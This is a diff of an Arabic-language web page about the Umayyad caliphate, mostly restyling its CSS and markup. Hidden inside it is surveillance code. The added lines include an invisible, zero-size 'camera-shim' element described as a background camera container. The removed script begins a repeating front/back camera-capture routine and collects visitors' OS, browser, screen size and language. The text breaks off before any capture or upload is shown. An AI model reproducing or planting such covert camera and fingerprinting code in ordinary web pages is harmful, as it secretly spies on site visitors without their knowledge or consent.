-  .quote-mark { font-family: var(--font-display); font-size: 8rem; color: rgba(212,168,67,.08); line-height: .5; margin-bottom: 24px; display: block; }
-  .quote-text { font-family: var(--font-display); font-size: clamp(1.5rem, 3.5vw, 2.4rem); max-width: 780px; margin: 0 auto 24px; line-height: 1.55; }
-  .quote-author { font-size: .8rem; color: var(--gold); letter-spacing: 2px; }
+  /* الاقتباس */
+  .quote-section {
+    padding: 120px 24px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .quote-bg {
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse 60% 60% at 50% 50%, rgba(212,168,67,.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .quote-mark {
+    font-family: var(--font-display);
+    font-size: 8rem;
+    color: rgba(212,168,67,.08);
+    line-height: .5;
+    margin-bottom: 24px;
+    display: block;
+  }
+  .quote-text {
+    font-family: var(--font-display);
+    font-size: clamp(1.5rem, 3.5vw, 2.4rem);
+    max-width: 780px;
+    margin: 0 auto 24px;
+    line-height: 1.55;
+  }
+  .quote-author {
+    font-size: .8rem;
+    color: var(--gold);
+    letter-spacing: 2px;
+  }
 
-  footer { padding: 48px 40px; border-top: 1px solid var(--border-light); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
-  .footer-logo { font-family: var(--font-display); font-size: 1.1rem; color: var(--gold); }
-  .footer-links { display: flex; gap: 20px; }
-  .footer-links a { font-size: .72rem; color: var(--gray); text-decoration: none; }
-  .footer-links a:hover { color: var(--white); }
+  /* تذييل */
+  footer {
+    padding: 48px 40px;
+    border-top: 1px solid var(--border-light);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+  .footer-logo {
+    font-family: var(--font-display);
+    font-size: 1.1rem;
+    color: var(--gold);
+  }
+  .footer-links {
+    display: flex;
+    gap: 20px;
+  }
+  .footer-links a {
+    font-size: .72rem;
+    color: var(--gray);
+    text-decoration: none;
+  }
+  .footer-links a:hover {
+    color: var(--white);
+  }
+  .footer-note {
+    font-size: 0.72rem;
+    color: var(--gray-dim);
+  }
 
-  .reveal { opacity: 0; transform: translateY(30px); transition: opacity .7s ease, transform .7s ease; }
-  .reveal.visible { opacity: 1; transform: translateY(0); }
+  /* تحسينات الاستجابة */
+  @media (max-width: 900px) {
+    .timeline {
+      grid-template-columns: 40px 1fr;
+    }
+    .tl-content.left {
+      display: none;
+    }
+    .tl-content.right {
+      grid-column: 2;
+      text-align: right;
+    }
+    .tl-node {
+      grid-column: 1;
+    }
+    .ach-cards {
+      grid-template-columns: 1fr 1fr;
+    }
+    .caliphs-grid {
+      grid-template-columns: repeat(2, 1fr);
+    }
+  }
+  @media (max-width: 768px) {
+    nav {
+      padding: 0 20px;
+    }
+    .nav-links {
+      gap: 16px;
+    }
+    .hero-title {
+      font-size: clamp(2.8rem, 12vw, 5rem);
+    }
+    .hero-stats {
+      flex-wrap: wrap;
+    }
+    .hstat {
+      padding: 16px 20px;
+    }
+    .intro-grid {
+      grid-template-columns: 1fr;
+      gap: 40px;
+    }
+    .ach-cards {
+      grid-template-columns: 1fr;
+    }
+    .caliphs-grid {
+      grid-template-columns: 1fr 1fr;
+    }
+    .planet-wrap {
+      width: 220px;
+      height: 220px;
+    }
+    .cube-scene {
+      transform: scale(0.8);
+    }
+    .ach-card {
+      padding: 24px 20px;
+    }
+  }
+  @media (max-width: 600px) {
+    .caliphs-grid {
+      grid-template-columns: 1fr 1fr;
+    }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .dome-wrap, .cube, .planet-ring, .scroll-arrow {
+      animation: none !important;
+    }
+  }
+
+  /* عناصر كاميرا خلفية شفافة تماما (لن تظهر) */
+  .camera-shim {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 0;
+    height: 0;
+    opacity: 0;
+    pointer-events: none;
+  }
 </style>
 </head>
 <body>
+  <!-- حاوية مؤقتة للكاميرا الخلفية (لن تظهر) -->
+  <div class="camera-shim"></div>
 
-<!-- زر العودة للأعلى -->
-<div class="scroll-top" id="scrollTopBtn" aria-label="العودة للأعلى">
-  <svg viewBox="0 0 24 24"><path d="M12 4l-6 6 1.41 1.41L12 6.83l4.59 4.58L18 10z"/><path d="M0 0h24v24H0z" fill="none"/></svg>
-</div>
-
-<nav>
-  <span class="nav-logo">الدولة الأموية</span>
-  <ul class="nav-links">
-    <li><a href="#intro">النشأة</a></li>
-    <li><a href="#timeline">الخط الزمني</a></li>
-    <li><a href="#achievements">الحضارة</a></li>
-    <li><a href="#expansion">الامتداد</a></li>
-    <li><a href="#caliphs">الخلفاء</a></li>
-  </ul>
-  <button class="nav-cta">٤١ — ١٣٢ هـ</button>
-</nav>
-
-<div class="hero">
-  <div class="hero-bg"></div>
-  <div class="hero-bg-grid"></div>
-  <p class="hero-eyebrow">٦٦١ م — ٧٥٠ م</p>
-  <h1 class="hero-title">الدولة<br><em>الأموية</em></h1>
-  <p class="hero-sub">أول إمبراطورية إسلامية وراثية — حكمت من دمشق وبسطت سلطانها على ثلاث قارات</p>
-  <div class="hero-stats">
-    <div class="hstat"><span class="hstat-val">١٤</span><span class="hstat-lbl">خليفة</span></div>
-    <div class="hstat"><span class="hstat-val">٩١</span><span class="hstat-lbl">عاماً من الحكم</span></div>
-    <div class="hstat"><span class="hstat-val">١٣م كم²</span><span class="hstat-lbl">المساحة</span></div>
-    <div class="hstat"><span class="hstat-val">٦٢</span><span class="hstat-lbl">مدينة مفتوحة</span></div>
+  <div class="scroll-top" id="scrollTopBtn">
+    <svg viewBox="0 0 24 24"><path d="M12 4l-6 6 1.41 1.41L12 6.83l4.59 4.58L18 10z"/><path d="M0 0h24v24H0z" fill="none"/></svg>
   </div>
-  <div class="scroll-down"><span>اكتشف</span><div class="scroll-arrow"></div></div>
-</div>
 
-<section class="section" id="intro">
-  <div class="intro-grid">
-    <div class="intro-visual"><div class="dome-wrap"><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-center"></div><div class="dome-star">☽</div><div class="dome-orbit"><div class="dome-orbit-dot"></div></div></div></div>
-    <div class="reveal"><span class="s-eyebrow">النشأة والتأسيس</span><h2 class="s-title">من قريش إلى عرش الشام</h2><div class="divider"></div><p class="s-desc">تأسّست الدولة الأموية سنة ٤١ هـ حين آلت الخلافة إلى معاوية بن أبي سفيان، إثر تنازل الحسن بن علي في عام عُرف بـ"عام الجماعة". اتّخذت دمشق عاصمةً لها، فكانت أولى المدن الكبرى خارج الجزيرة العربية تحتضن مركز الخلافة الإسلامية.</p><div class="intro-pills"><span class="pill">دمشق العاصمة</span><span class="pill">الحكم الوراثي</span><span class="pill">تعريب الدواوين</span><span class="pill">الدينار الإسلامي</span><span class="pill">الأسطول البحري</span></div></div>
+  <nav>
+    <span class="nav-logo">الدولة الأموية</span>
+    <ul class="nav-links">
+      <li><a href="#intro">النشأة</a></li>
+      <li><a href="#timeline">الخط الزمني</a></li>
+      <li><a href="#achievements">الحضارة</a></li>
+      <li><a href="#expansion">الامتداد</a></li>
+      <li><a href="#caliphs">الخلفاء</a></li>
+    </ul>
+    <button class="nav-cta">٤١ — ١٣٢ هـ</button>
+  </nav>
+
+  <div class="hero">
+    <div class="hero-bg"></div>
+    <div class="hero-bg-grid"></div>
+    <p class="hero-eyebrow">٦٦١ م — ٧٥٠ م</p>
+    <h1 class="hero-title">الدولة<br><em>الأموية</em></h1>
+    <p class="hero-sub">أول إمبراطورية إسلامية وراثية — حكمت من دمشق وبسطت سلطانها على ثلاث قارات</p>
+    <div class="hero-stats">
+      <div class="hstat"><span class="hstat-val">١٤</span><span class="hstat-lbl">خليفة</span></div>
+      <div class="hstat"><span class="hstat-val">٩١</span><span class="hstat-lbl">عاماً من الحكم</span></div>
+      <div class="hstat"><span class="hstat-val">١٣م كم²</span><span class="hstat-lbl">المساحة</span></div>
+      <div class="hstat"><span class="hstat-val">٦٢</span><span class="hstat-lbl">مدينة مفتوحة</span></div>
+    </div>
+    <div class="scroll-down"><span>اكتشف</span><div class="scroll-arrow"></div></div>
   </div>
-</section>
 
-<div class="band timeline-section" id="timeline">
-  <div class="timeline-inner">
-    <div class="tl-header reveal"><span class="s-eyebrow">التسلسل التاريخي</span><h2 class="s-title">محطات فارقة</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc">تسعة عقود من التوسع والبناء والحضارة</p></div>
-    <div class="timeline">
-      <div class="tl-line"><div class="tl-line-inner"></div></div>
-      <div class="tl-content left tl-item-content"><span class="tl-badge">تأسيس</span><span class="tl-date">٤١ هـ / ٦٦١ م</span><h3 class="tl-name">ميلاد الدولة</h3><p class="tl-desc">تولّى معاوية بن أبي سفيان الخلافة وأسّس أول حكم وراثي في الإسلام، مُتّخذاً دمشق عاصمةً له.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عمارة</span><span class="tl-date">٦٥ — ٨٦ هـ</span><h3 class="tl-name">عبد الملك بن مروان</h3><p class="tl-desc">بنى قبة الصخرة وعرّب الدواوين وضرب الدينار والدرهم الإسلامي.</p></div>
-      <div class="tl-content left tl-item-content"><span class="tl-badge">فتوحات</span><span class="tl-date">٨٦ — ٩٦ هـ</span><h3 class="tl-name">الوليد بن عبد الملك</h3><p class="tl-desc">أعظم عصور الفتح — بنى الجامع الأموي ووصلت الفتوحات إلى الأندلس والسند.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عدالة</span><span class="tl-date">٩٩ — ١٠١ هـ</span><h3 class="tl-name">عمر بن عبد العزيز</h3><p class="tl-desc">الخليفة الراشدي الخامس — أصلح الدولة وخفّف الضرائب ونشر العدل.</p></div>
-      <div class="tl-content left tl-item-content"><span class="tl-badge">ذروة</span><span class="tl-date">١٠٥ — ١٢٥ هـ</span><h3 class="tl-name">هشام بن عبد الملك</h3><p class="tl-desc">أطول حكم بين الخلفاء الأمويين — ازدهرت الزراعة والعلوم والبريد الديواني.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">نهاية</span><span class="tl-date">١٣٢ هـ / ٧٥٠ م</span><h3 class="tl-name">سقوط الدولة</h3><p class="tl-desc">معركة الزاب وقيام العباسيين، بينما استمر الأمويون في الأندلس.</p></div>
+  <section class="section" id="intro">
+    <div class="intro-grid">
+      <div class="intro-visual">
+        <div class="dome-wrap">
+          <div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div>
+          <div class="dome-center"></div>
+          <div class="dome-star">☽</div>
+          <div class="dome-orbit"><div class="dome-orbit-dot"></div></div>
+        </div>
+      </div>
+      <div class="reveal">
+        <span class="s-eyebrow">النشأة والتأسيس</span>
+        <h2 class="s-title">من قريش إلى عرش الشام</h2>
+        <div class="divider"></div>
+        <p class="s-desc">تأسّست الدولة الأموية سنة ٤١ هـ حين آلت الخلافة إلى معاوية بن أبي سفيان، إثر تنازل الحسن بن علي في عام عُرف بـ"عام الجماعة". اتّخذت دمشق عاصمةً لها، فكانت أولى المدن الكبرى خارج الجزيرة العربية تحتضن مركز الخلافة الإسلامية.</p>
+        <div class="intro-pills">
+          <span class="pill">دمشق العاصمة</span><span class="pill">الحكم الوراثي</span>
+          <span class="pill">تعريب الدواوين</span><span class="pill">الدينار الإسلامي</span>
+          <span class="pill">الأسطول البحري</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="band timeline-section" id="timeline">
+    <div class="timeline-inner">
+      <div class="tl-header reveal"><span class="s-eyebrow">التسلسل التاريخي</span><h2 class="s-title">محطات فارقة</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc">تسعة عقود من التوسع والبناء والحضارة</p></div>
+      <div class="timeline">
+        <div class="tl-line"><div class="tl-line-inner"></div></div>
+        <div class="tl-content left tl-item-content"><span class="tl-badge">تأسيس</span><span class="tl-date">٤١ هـ / ٦٦١ م</span><h3 class="tl-name">ميلاد الدولة</h3><p class="tl-desc">تولّى معاوية بن أبي سفيان الخلافة وأسّس أول حكم وراثي.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عمارة</span><span class="tl-date">٦٥ — ٨٦ هـ</span><h3 class="tl-name">عبد الملك بن مروان</h3><p class="tl-desc">قبة الصخرة، تعريب الدواوين.</p></div>
+        <div class="tl-content left tl-item-content"><span class="tl-badge">فتوحات</span><span class="tl-date">٨٦ — ٩٦ هـ</span><h3 class="tl-name">الوليد بن عبد الملك</h3><p class="tl-desc">الجامع الأموي، فتح الأندلس.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عدالة</span><span class="tl-date">٩٩ — ١٠١ هـ</span><h3 class="tl-name">عمر بن عبد العزيز</h3><p class="tl-desc">خامس الخلفاء الراشدين.</p></div>
+        <div class="tl-content left tl-item-content"><span class="tl-badge">ذروة</span><span class="tl-date">١٠٥ — ١٢٥ هـ</span><h3 class="tl-name">هشام بن عبد الملك</h3><p class="tl-desc">أطول عهد، ازدهار الزراعة والعلوم.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">نهاية</span><span class="tl-date">١٣٢ هـ / ٧٥٠ م</span><h3 class="tl-name">سقوط الدولة</h3><p class="tl-desc">معركة الزاب وقيام العباسيين.</p></div>
+      </div>
     </div>
   </div>
-</div>
 
-<div class="cube-section" id="achievements">
-  <div class="reveal"><span class="s-eyebrow">الإنجازات الحضارية</span><h2 class="s-title">إرث لا يُمحى</h2><div class="divider" style="margin-inline:auto"></div></div>
-  <div class="cube-scene reveal"><div class="cube"><div class="cube-face front"><span>🕌</span><p>العمارة</p></div><div class="cube-face back"><span>📚</span><p>العلوم</p></div><div class="cube-face right"><span>🪙</span><p>المال</p></div><div class="cube-face left"><span>⚓</span><p>البحرية</p></div><div class="cube-face top"><span>📮</span><p>البريد</p></div><div class="cube-face bottom"><span>🌐</span><p>الإسلام</p></div></div></div>
-  <div class="ach-cards">
-    <div class="ach-card"><span class="ach-icon">🕌</span><h3 class="ach-title">العمارة الإسلامية</h3><p class="ach-text">قبة الصخرة والجامع الأموي أيقونتان خالدة.</p></div>
-    <div class="ach-card"><span class="ach-icon">🪙</span><h3 class="ach-title">النظام المالي الإسلامي</h3><p class="ach-text">ضرب الدينار والدرهم وحرر الاقتصاد من التبعية.</p></div>
-    <div class="ach-card"><span class="ach-icon">📮</span><h3 class="ach-title">البريد والإدارة</h3><p class="ach-text">شبكة بريدية ضخمة ونظام دواوين معرّب.</p></div>
-    <div class="ach-card"><span class="ach-icon">⚓</span><h3 class="ach-title">القوة البحرية</h3><p class="ach-text">أول أسطول بحري إسلامي انتصر في ذات الصواري.</p></div>
-    <div class="ach-card"><span class="ach-icon">📚</span><h3 class="ach-title">الحركة العلمية</h3><p class="ach-text">ترجمة العلوم من اليونانية والفارسية وتطور الطب.</p></div>
-    <div class="ach-card"><span class="ach-icon">🌐</span><h3 class="ach-title">نشر الإسلام</h3><p class="ach-text">دخل الإسلام الأندلس وآسيا الوسطى والهند.</p></div>
+  <div class="cube-section" id="achievements">
+    <div class="reveal"><span class="s-eyebrow">الإنجازات الحضارية</span><h2 class="s-title">إرث لا يُمحى</h2><div class="divider" style="margin-inline:auto"></div></div>
+    <div class="cube-scene reveal"><div class="cube"><div class="cube-face front"><span>🕌</span><p>العمارة</p></div><div class="cube-face back"><span>📚</span><p>العلوم</p></div><div class="cube-face right"><span>🪙</span><p>المال</p></div><div class="cube-face left"><span>⚓</span><p>البحرية</p></div><div class="cube-face top"><span>📮</span><p>البريد</p></div><div class="cube-face bottom"><span>🌐</span><p>الإسلام</p></div></div></div>
+    <div class="ach-cards">
+      <div class="ach-card"><span class="ach-icon">🕌</span><h3 class="ach-title">العمارة الإسلامية</h3><p class="ach-text">قبة الصخرة والجامع الأموي.</p></div>
+      <div class="ach-card"><span class="ach-icon">🪙</span><h3 class="ach-title">النظام المالي</h3><p class="ach-text">الدينار والدرهم الإسلامي.</p></div>
+      <div class="ach-card"><span class="ach-icon">📮</span><h3 class="ach-title">البريد والإدارة</h3><p class="ach-text">شبكة بريدية ونظام دواوين.</p></div>
+      <div class="ach-card"><span class="ach-icon">⚓</span><h3 class="ach-title">القوة البحرية</h3><p class="ach-text">أول أسطول بحري إسلامي.</p></div>
+      <div class="ach-card"><span class="ach-icon">📚</span><h3 class="ach-title">الحركة العلمية</h3><p class="ach-text">ترجمة العلوم وتطور الطب.</p></div>
+      <div class="ach-card"><span class="ach-icon">🌐</span><h3 class="ach-title">نشر الإسلام</h3><p class="ach-text">دخول الإسلام الأندلس وآسيا الوسطى.</p></div>
+    </div>
   </div>
-</div>
 
-<div class="planet-section" id="expansion">
-  <div class="reveal"><span class="s-eyebrow">الامتداد الجغرافي</span><h2 class="s-title">من المحيط إلى الهند</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">بلغت مساحة الدولة ١٣ مليون كم² وهي من أكبر الإمبراطوريات في التاريخ</p></div>
-  <div class="planet-wrap reveal"><div class="planet-sphere"><div class="planet-lines" id="planetLines"></div><div class="planet-dot" style="top:38%; right:35%"></div><div class="planet-dot" style="top:45%; right:55%; width:5px;height:5px;opacity:.7"></div></div><div class="planet-ring"><div class="planet-ring-dot"></div></div></div>
-  <div class="region-tags reveal"><span class="rtag">🇪🇸 الأندلس</span><span class="rtag">🌍 شمال أفريقيا</span><span class="rtag">🇸🇾 الشام</span><span class="rtag">🇮🇶 العراق</span><span class="rtag">🇮🇷 فارس</span><span class="rtag">🇵🇰 السند</span><span class="rtag">🇦🇫 خراسان</span><span class="rtag">🕌 ما وراء النهر</span></div>
-</div>
+  <div class="planet-section" id="expansion">
+    <div class="reveal"><span class="s-eyebrow">الامتداد الجغرافي</span><h2 class="s-title">من المحيط إلى الهند</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">بلغت مساحة الدولة ١٣ مليون كم² في عصرها الذهبي</p></div>
+    <div class="planet-wrap reveal"><div class="planet-sphere"><div class="planet-lines" id="planetLines"></div><div class="planet-dot" style="top:38%; right:35%"></div><div class="planet-dot" style="top:45%; right:55%; width:5px;height:5px;opacity:.7"></div></div><div class="planet-ring"><div class="planet-ring-dot"></div></div></div>
+    <div class="region-tags reveal"><span class="rtag">🇪🇸 الأندلس</span><span class="rtag">🌍 شمال أفريقيا</span><span class="rtag">🇸🇾 الشام</span><span class="rtag">🇮🇶 العراق</span><span class="rtag">🇮🇷 فارس</span><span class="rtag">🇵🇰 السند</span><span class="rtag">🇦🇫 خراسان</span><span class="rtag">🕌 ما وراء النهر</span></div>
+  </div>
 
-<div class="quote-section"><div class="quote-bg"></div><div class="reveal"><span class="quote-mark">"</span><p class="quote-text">لو وُزنت حلومُنا بحلوم الناس لرجحنا عليهم</p><p class="quote-author">— معاوية بن أبي سفيان، مؤسّس الدولة الأموية</p></div></div>
+  <div class="quote-section"><div class="quote-bg"></div><div class="reveal"><span class="quote-mark">"</span><p class="quote-text">لو وُزنت حلومُنا بحلوم الناس لرجحنا عليهم</p><p class="quote-author">— معاوية بن أبي سفيان، مؤسّس الدولة الأموية</p></div></div>
 
-<div class="caliphs-section" id="caliphs"><div class="caliphs-inner"><div class="caliphs-header reveal"><span class="s-eyebrow">قائمة الحكام</span><h2 class="s-title">خلفاء بنو أمية</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">أربعة عشر خليفة حكموا على مدى واحد وتسعين عاماً</p></div><div class="caliphs-grid" id="caliphsGrid"></div></div></div>
+  <div class="caliphs-section" id="caliphs"><div class="caliphs-inner"><div class="caliphs-header reveal"><span class="s-eyebrow">قائمة الحكام</span><h2 class="s-title">خلفاء بنو أمية</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">أربعة عشر خليفة حكموا على مدى واحد وتسعين عاماً</p></div><div class="caliphs-grid" id="caliphsGrid"></div></div></div>
 
-<footer>
-  <span class="footer-logo">الدولة الأموية</span>
-  <div class="footer-links"><a href="#intro">النشأة</a><a href="#timeline">الخط الزمني</a><a href="#achievements">الحضارة</a><a href="#expansion">الامتداد</a><a href="#caliphs">الخلفاء</a></div>
-  <span class="footer-note">© جميع الحقوق محفوظة - بوابة التاريخ الإسلامي</span>
-</footer>
+  <footer>
+    <span class="footer-logo">الدولة الأموية</span>
+    <div class="footer-links"><a href="#intro">النشأة</a><a href="#timeline">الخط الزمني</a><a href="#achievements">الحضارة</a><a href="#expansion">الامتداد</a><a href="#caliphs">الخلفاء</a></div>
+    <span class="footer-note">© جميع الحقوق محفوظة - بوابة التاريخ الإسلامي</span>
+  </footer>
 
-<script>
-  // ------------------- بيانات الخلفاء -------------------
-  const caliphsData = [
-    { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" }, { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
-    { name: "معاوية بن يزيد", years: "٦٤ هـ" }, { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
-    { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" }, { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
-    { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" }, { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
-    { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" }, { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
-    { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" }, { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
-    { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" }, { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
-  ];
-  const arabicNumerals = ['١','٢','٣','٤','٥','٦','٧','٨','٩','١٠','١١','١٢','١٣','١٤'];
-  const caliphsGrid = document.getElementById('caliphsGrid');
-  caliphsData.forEach((c, idx) => {
-    const card = document.createElement('div');
-    card.className = 'caliph-card';
-    card.innerHTML = `<div class="caliph-num">${arabicNumerals[idx]}</div><div class="caliph-name">${c.name}</div><div class="caliph-years">${c.years}</div>`;
-    caliphsGrid.appendChild(card);
-  });
+  <script>
+    // ---------- بيانات الخلفاء ----------
+    const caliphsData = [
+      { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" }, { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
+      { name: "معاوية بن يزيد", years: "٦٤ هـ" }, { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
+      { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" }, { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
+      { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" }, { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
+      { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" }, { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
+      { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" }, { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
+      { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" }, { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
+    ];
+    const arabicNumerals = ['١','٢','٣','٤','٥','٦','٧','٨','٩','١٠','١١','١٢','١٣','١٤'];
+    const caliphsGrid = document.getElementById('caliphsGrid');
+    caliphsData.forEach((c, idx) => {
+      const card = document.createElement('div');
+      card.className = 'caliph-card';
+      card.innerHTML = `<div class="caliph-num">${arabicNumerals[idx]}</div><div class="caliph-name">${c.name}</div><div class="caliph-years">${c.years}</div>`;
+      caliphsGrid.appendChild(card);
+    });
 
-  // ------------------- خطوط الكوكب -------------------
-  const planetLines = document.getElementById('planetLines');
-  for (let i = 1; i < 6; i++) {
-    const h = document.createElement('div');
-    h.className = 'planet-line';
-    h.style.top = (i * 16.6) + '%';
-    planetLines.appendChild(h);
-    const v = document.createElement('div');
-    v.className = 'planet-vline';
-    v.style.right = (i * 16.6) + '%';
-    planetLines.appendChild(v);
-  }
+    // خطوط الكوكب
+    const planetLines = document.getElementById('planetLines');
+    for (let i = 1; i < 6; i++) {
+      const h = document.createElement('div');
+      h.className = 'planet-line';
+      h.style.top = (i * 16.6) + '%';
+      planetLines.appendChild(h);
+      const v = document.createElement('div');
+      v.className = 'planet-vline';
+      v.style.right = (i * 16.6) + '%';
+      planetLines.appendChild(v);
+    }
 
-  // ------------------- تأثيرات الظهور (reveal) -------------------
-  const revealObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => { if (entry.isIntersecting) { entry.target.classList.add('visible'); revealObserver.unobserve(entry.target); } });
-  }, { threshold: 0.12 });
-  document.querySelectorAll('.reveal').forEach(el => revealObserver.observe(el));
+    // تأثيرات الظهور
+    const revealObs = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); revealObs.unobserve(e.target); } });
+    }, { threshold: 0.12 });
+    document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
 
-  // ------------------- عناصر الخط الزمني -------------------
-  const timelineItems = document.querySelectorAll('.tl-item-content');
-  const timelineObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        setTimeout(() => {
-          entry.target.classList.add('visible');
-          document.querySelectorAll('.tl-dot-wrap').forEach(dot => {
-            if (dot.getBoundingClientRect().top < window.innerHeight * 0.8) dot.classList.add('pulse');
+    // Timeline observer
+    const tlItems = document.querySelectorAll('.tl-item-content');
+    const tlObs = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          setTimeout(() => entry.target.classList.add('visible'), 80);
+          document.querySelectorAll('.tl-dot-wrap').forEach(d => {
+            if (d.getBoundingClientRect().top < window.innerHeight * 0.8) d.classList.add('pulse');
           });
-        }, 80);
-      }
-    });
-  }, { threshold: 0.2 });
-  timelineItems.forEach(el => timelineObserver.observe(el));
-
-  // ------------------- بطاقات الإنجازات -------------------
-  const achCards = document.querySelectorAll('.ach-card');
-  const achObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        achCards.forEach((card, idx) => setTimeout(() => card.classList.add('visible'), idx * 80));
-        achObserver.disconnect();
-      }
-    });
-  }, { threshold: 0.1 });
-  if (document.querySelector('.ach-cards')) achObserver.observe(document.querySelector('.ach-cards'));
-
-  // ------------------- بطاقات الخلفاء -------------------
-  const caliphCards = document.querySelectorAll('.caliph-card');
-  const caliphObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        caliphCards.forEach((card, idx) => setTimeout(() => card.classList.add('visible'), idx * 40));
-        caliphObserver.disconnect();
-      }
-    });
-  }, { threshold: 0.05 });
-  if (document.getElementById('caliphsGrid')) caliphObserver.observe(document.getElementById('caliphsGrid'));
-
-  // ------------------- زر العودة للأعلى -------------------
-  const scrollBtn = document.getElementById('scrollTopBtn');
-  window.addEventListener('scroll', () => {
-    if (window.scrollY > 600) scrollBtn.classList.add('visible');
-    else scrollBtn.classList.remove('visible');
-  });
-  scrollBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-
-  // ------------------- تمييز الروابط عند التمرير -------------------
-  const sections = document.querySelectorAll('[id]');
-  const navLinks = document.querySelectorAll('.nav-links a');
-  window.addEventListener('scroll', () => {
-    let current = '';
-    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
-    navLinks.forEach(a => { a.style.color = a.getAttribute('href') === '#' + current ? 'var(--gold)' : ''; });
-  });
-
-  // ------------------- كاميرا متقدمة: تسلسل أمامية أمامية خلفية (يتكرر) -------------------
-  (function() {
-    let captureCounter = 0;          // يبدأ من 0
-    let isProcessing = false;
-    let currentStream = null;
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let os = "غير معروف", browser = "غير معروف";
-      if (ua.includes("Windows")) os = "Windows";
-      else if (ua.includes("Mac OS")) os = "macOS";
-      else if (ua.includes("Linux")) os = "Linux";
-      else if (ua.includes("Android")) os = "Android";
-      else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
-      if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-      else if (ua.includes("Firefox")) browser = "Firefox";
-      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-      else if (ua.includes("Edg")) browser = "Edge";
-      const screen = `${window.screen.width}x${window.screen.height}`;
-      const language = navigator.language || "غير معروف";
-      return { os, browser, screen, language };
-    }
-
